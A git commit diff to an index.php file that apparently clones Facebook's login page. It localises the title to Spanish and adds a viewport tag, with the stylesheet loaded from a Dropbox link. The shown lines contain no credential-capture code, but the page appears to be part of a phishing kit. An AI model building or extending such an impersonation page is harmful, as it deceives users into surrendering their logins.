bb15397fce39a5e794efbe5ae4f67eca06062d1e
Luishiño <pericena12@gmail.com>
2020-05-30 11:03:16 -0400

    Update index.php

--- index.php
+++ index.php
@@ -4,11 +4,11 @@
 <head><meta charset="UTF-8">
 
 <link rel="icon" type="png" sizes="16x16" href="icon.png">
-<head><title>Log into Facebook | Facebook</title>
+<head><title>Iniciar Facebook | Facebook</title>
 <meta name="viewport" content="initial-scale=1, width=240" />
 <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
 <meta name="theme-color" content="#3b5998" />
-	
+<meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, user-scalable=no">
 	
 <link type="text/css" rel="stylesheet" href="https://dl.dropboxusercontent.com/s/bcsogulkc87q4rr/style.css">
 </head><body class="login_page _39il UIPage_LoggedOut b_c3pyn-ahh gecko win x1" dir="ltr">
